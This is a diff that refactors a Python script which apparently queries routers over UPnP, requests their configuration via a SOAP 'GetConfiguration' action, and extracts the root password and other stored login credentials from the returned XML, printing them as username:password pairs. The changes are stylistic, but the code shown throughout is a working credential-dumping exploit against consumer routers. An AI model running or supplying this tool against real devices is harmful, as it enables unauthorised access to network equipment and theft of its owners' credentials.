@@ -17,7 +17,6 @@ import xml.etree.ElementTree as ET
 
 #Dump the usernames and passwords from the router config
 def dump_passwords(cfg):
-    o = []
     r = ET.fromstring(cfg)
 
     #get the admin (root) password
@@ -26,8 +25,7 @@ def dump_passwords(cfg):
     if root_pass[-1] == '\x00':
         root_pass = root_pass[:-1]
 
-    o.append({'username':'root', 'password':root_pass})
-
+    o = [{'username': 'root', 'password': root_pass}]
     #get the other configured passwords.
     #we only want elements with the instance attribute.
     for i in r.findall('./InternetGatewayDevice/X_5067F0_LoginCfg/X_5067F0_Login_Group/Use_Login_Info[@instance]'):
@@ -58,14 +56,16 @@ def get_router_config():
     #get the info from the router and check if its one we are looking for
     #most of this section ripped from the host get command in miranda
     for k,h in hp.ENUM_HOSTS.items():
-        print("Requesting device and service info for %s (this could take a few seconds)..." % (h['name']))
+        print(
+            f"Requesting device and service info for {h['name']} (this could take a few seconds)..."
+        )
 
         (xmlHeaders,xmlData) = hp.getXML(h['xmlFile'])
         if xmlData == False:
             print('Failed to request host XML file:',h['xmlFile'])
             return
         if hp.getHostInfo(xmlData,xmlHeaders,k) == False:
-            print("Failed to get device/service info for %s..." % h['name'])
+            print(f"Failed to get device/service info for {h['name']}...")
             return
         print('Host data enumeration complete! Checking for GetConfiguration action...')
 
@@ -85,17 +85,14 @@ def get_router_config():
                 #send the request
                 sr = hp.sendSOAP(h['name'],fullServiceName,controlURL,'GetConfiguration',{})
                 if sr != False:
-                    tv = hp.extractSingleTag(sr,'NewConfigFile')
-                    return tv
-
+                    return hp.extractSingleTag(sr,'NewConfigFile')
         except KeyError:
             pass
 
 if __name__ == '__main__':
-    cfg= get_router_config()
-    if cfg:
+    if cfg := get_router_config():
         p = dump_passwords(cfg)
         for i in p:
-            print('%s:%s' % (i['username'], i['password']))
+            print(f"{i['username']}:{i['password']}")
     else:
         print('Configuration file not found')
